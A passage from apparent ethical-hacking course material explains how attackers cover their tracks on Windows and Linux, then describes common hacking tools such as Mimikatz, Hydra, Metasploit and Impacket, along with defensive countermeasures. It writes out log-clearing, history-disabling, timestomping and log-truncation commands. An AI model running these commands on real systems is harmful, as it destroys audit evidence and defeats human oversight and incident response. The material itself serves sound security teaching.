Removing or wiping the event and audit logs that record authentication, process creation, and security events. The bluntest approach — clearing an entire log — is also the most detectable, because the clearing itself is recorded and the resulting empty log is conspicuous.

⏰ Timestamp manipulation

Altering file MAC times (Modified, Accessed, Created) so that malicious files appear old and unremarkable rather than freshly created during the intrusion — a technique called timestomping. It defeats forensic timelines that rely on "what changed around the time of the breach."

🗑️ Selective deletion

Removing specific evidence — dropped tools, downloaded payloads, command history — rather than wiping everything. More surgical and less conspicuous than clearing whole logs, but it requires the attacker to know exactly what they touched.

🔀 Trail obfuscation

Rather than deleting, drowning the evidence in noise or misdirection — injecting false entries, routing through intermediaries, or disabling auditing before acting so no record is created in the first place. Disabling logging pre-emptively is stealthier than deleting logs afterward.

Windows track covering

On Windows, the Event Log is the primary target. Attackers clear it with built-in tools (wevtutil cl, or PowerShell's Clear-EventLog), but as noted this generates the tell-tale Event ID 1102. More sophisticated actors manipulate auditing settings via the registry or Group Policy to stop events being recorded in the first place, or use tools that surgically remove individual event records while leaving the log otherwise intact — far harder to spot than a wholesale clear. Timestomping is performed with tools that rewrite the NTFS MAC times on dropped files. The registry itself is both a target (Run keys and other persistence artifacts get cleaned up) and a tool (auditing configuration lives there).

# Clearing the Security log with the built-in utility — generates Event ID 1102 wevtutil cl Security # Listing logs an attacker might target wevtutil el

Linux track covering

On Linux, the equivalent targets are the text-based logs in /var/log (notably auth.log and syslog), the shell history file (~/.bash_history), and file timestamps. A crude attacker overwrites or truncates a log; a careful one edits out only the lines relating to their activity, or disables history logging for their session before acting. Shell history is a frequent oversight — an attacker who forgets to disable it hands investigators a complete transcript of their commands.

# Disable history for the current session (stealthier than deleting it later) unset HISTFILE export HISTSIZE=0 # Timestamp manipulation: make a file's times match a reference file touch -r /bin/ls /tmp/malicious_payload # Truncating a log (crude — leaves a conspicuous gap) cat /dev/null > /var/log/auth.log

Why covering tracks so often fails — the defender's advantage

Track covering is the phase where well-prepared defenders most reliably catch attackers, for a structural reason: the attacker is trying to control a record from inside the system that produces it, and modern logging architectures deliberately move that record beyond their reach. The key defenses:

  • Centralized, real-time log forwarding. If every log is shipped to a SIEM the instant it is written, deleting the local copy accomplishes nothing — the evidence is already gone from the attacker's control. This single measure defeats most track-covering.
  • Alert on the clearing event itself. Event ID 1102 (Windows log cleared), sudden log gaps, and history-disabling commands are high-fidelity indicators. The cleanup action becomes the alarm.
  • Write-once and integrity-protected logs. Append-only storage and cryptographic log integrity (hashing chains) make silent tampering detectable.
  • File-integrity monitoring. Tools that baseline MAC times and file hashes flag timestomping and unexpected modifications that the attacker tried to disguise.
  • Restricted audit-configuration access. Preventing non-administrators from altering auditing settings closes the "disable logging before acting" route.

The takeaway that ties the module together: covering tracks is the attacker's admission that logs are dangerous to them. Everything that makes logs harder to reach, alter, or silence — forwarding, integrity protection, alerting on tampering — directly strengthens your ability to detect every other phase of the attack as well.

🛠️ System Hacking Tools

How to think about the toolkit

It is tempting to treat a security certification as a list of tools to memorize, but that gets the emphasis backwards. Tools change — they are updated, deprecated, and replaced — while the techniques they implement endure. The right way to learn this toolkit is to attach each tool to the phase it serves and the concept it applies, so that when a tool falls out of favor you can immediately identify its successor. The tools below are grouped by the job they do, and each entry names the underlying technique it automates.

Credential access and cracking

Hashcat & John the Ripper

Offline password cracking (covered in Password Attacks). Hashcat is the GPU-accelerated speed leader; John is the flexible CPU-based generalist. Both implement dictionary, rule-based, and mask attacks against dumped hashes.

Hydra

Online credential attacks against live network services — SSH, RDP, FTP, HTTP forms. Implements dictionary and brute-force guessing where lockout policies are weak.

Mimikatz

The definitive Windows credential-extraction tool. Reads plaintext passwords, hashes, and Kerberos tickets from lsass.exe memory; enables pass-the-hash and pass-the-ticket attacks. Requires SeDebugPrivilege — which ties it directly to the escalation phase.

Responder

Poisons Windows name-resolution (LLMNR/NBT-NS) to capture NetNTLMv2 authentication exchanges off the network, which are then cracked offline. A passive-capture technique rather than a guessing one.

Exploitation and escalation

Metasploit Framework

The all-purpose exploitation platform: delivers payloads, manages Meterpreter sessions, and — via local_exploit_suggester — automates the search for applicable privilege-escalation exploits. Central to gaining access and escalating.

WinPEAS & LinPEAS / PowerUp

Escalation enumeration. These walk the entire privilege-escalation surface on Windows and Linux and flag likely wins — misconfigured services, dangerous privileges, writable files. As useful to defenders auditing their own hosts as to attackers.

PrintSpoofer / GodPotato

Token-impersonation exploits that abuse SeImpersonatePrivilege to reach SYSTEM on modern Windows (the successors to JuicyPotato). The specific tool depends on the OS build.

Impacket suite

A collection of Python tools for Windows network protocols — secretsdump (remote hash extraction), psexec/wmiexec (remote execution), and more. The connective tissue of Windows post-exploitation.

Concealment and detection

GMER & rootkit scanners

A defensive tool: detects kernel-mode rootkits by cross-view analysis — comparing what the OS reports against what it finds by inspecting lower-level structures directly, exposing the discrepancies a rootkit creates.

Steghide / OpenStego

Steganography tools that embed and extract hidden payloads in image and audio carriers (covered in the Steganography section), optionally with passphrase encryption.

The dual-use reality

Nearly every tool in this list serves both attacker and defender. WinPEAS finds an escalation path for a penetration tester and closes it for a system administrator. GMER hunts rootkits for a blue team. Mimikatz demonstrates credential exposure so an organization can deploy Credential Guard against it. This is the essence of ethical hacking: the same knowledge that enables an attack enables its defense, and the value of learning the offensive tool is that it teaches you exactly what to watch for and what to harden. A defender who has never run these tools is defending against an attacker they cannot picture.
